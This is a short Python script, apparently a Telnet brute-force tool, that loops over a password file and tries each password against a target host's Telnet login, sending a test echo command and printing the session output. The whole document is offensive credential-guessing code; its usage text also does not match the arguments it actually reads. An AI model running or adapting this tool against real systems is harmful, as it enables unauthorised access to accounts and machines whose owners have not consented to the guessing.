#!/usr/bin/python3
import sys
from telnetlib import Telnet
def enc(s):
  return s.encode("ascii")

def usage():
  print("usage of Telnet Bruteforce:")
  print()
  print("sudo python3 telnet_bruteforce.py <ipaddress> <port>")

if(sys.argv[1] == "-h"):
    usage()
    exit()

host = sys.argv[1]
user = sys.argv[2]
passFile = sys.argv[3]

port = sys.argv[sys.argv.index("-p")+1]


with open(passFile, "r") as f:
        global count
        for password in f.readlines():
            password = password.strip()
            

            tel = Telnet(host, port)
            tel.read_until(enc("login: "))
            tel.write(enc(user + "\n"))
            tel.read_until(enc("Password: "))
            tel.write(enc(password + "\n"))
            tel.write(enc("echo 'Rahul Ramesh'" + "\n"))
            tel.write(enc("exit\n"))
            text = tel.read_all().decode("ascii")
            print(text)